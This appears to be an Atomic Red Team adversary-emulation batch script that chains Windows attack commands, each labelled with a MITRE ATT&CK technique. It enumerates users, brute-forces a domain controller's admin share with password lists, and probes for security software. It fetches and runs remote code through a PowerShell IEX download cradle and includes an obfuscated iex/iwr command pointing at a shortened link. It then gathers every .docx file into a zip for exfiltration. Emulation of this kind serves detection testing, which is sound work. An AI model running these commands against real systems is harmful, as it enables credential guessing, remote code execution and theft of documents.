:: Chain Reaction - Reactor
::
::

:: Tactic: Discovery
:: Technique: System Owner/User Discovery: https://attack.mitre.org/wiki/Technique/T1033

:: Single Endpoint

:: for /F “tokens=1,2” %i in (‘qwinsta /server:<COMPUTERNAME> ^| findstr “Active Disc”‘) do @echo %i | find /v “#” | find /v “console” || echo %j > usernames.txt

:: Multiple Endpoints

@FOR /F %n in (computers.txt) DO @FOR /F “tokens=1,2” %i in (‘qwinsta /server:%n ^| findstr “Active Disc”’) do @echo %i | find /v “#” | find /v “console” || echo %j > usernames.txt


:: Tactic: Credential Access, Lateral Movement
:: Technique: Brute Force: https://attack.mitre.org/wiki/Technique/T1110
:: Technique: Windows Admin Shares: https://attack.mitre.org/wiki/Technique/T1077

@FOR /F %n in (usernames.txt) DO @FOR /F %p in (passwords.txt) DO @net use \\COMPANYDC1\IPC$ /user:COMPANY\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\COMPANYDC1\IPC$ > NUL


:: Tactic: Discovery
:: Technique: Security Software Discovery: https://attack.mitre.org/wiki/Technique/T1063

netsh.exe advfirewall firewall show all profiles

tasklist.exe | findstr cb

tasklist.exe | findstr virus

tasklist.exe | findstr defender

:: Tactic: Execution, Discovery
:: Technique: PowerShell: https://attack.mitre.org/wiki/Technique/T1086
:: Technique: Multiple Discovery

powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat')"

:: Tactic: Execution
:: Technique: Powershell: https://attack.mitre.org/wiki/Technique/T1086

:: cmd /c "set apple=fish (cars help://bit.ly/L3g1t).content&&cmd /c set boat=%apple:fish=iex% ^&^&cmd /c set ab=%boat:cars=iwr% ^^^&^^^&cmd /c echo %ab:el=tt%|%ProgramData:~3,1%%ProgramData:~5,1%we%ProgramData:~7,1%she%Public:~12,1%%Public:~12,1% -"

:: Tactic: Collection
:: Technique: Automated Collection: https://attack.mitre.org/wiki/Technique/T1119

for /R c: %f in (*.docx) do copy %f c:\temp\

:: Tactic: Exfiltration
:: Technique: Data Compressed: https://attack.mitre.org/wiki/Technique/T1002

powershell.exe dir c:\temp -Recurse | Compress-Archive -DestinationPath C:\temp\allthedataz.zip
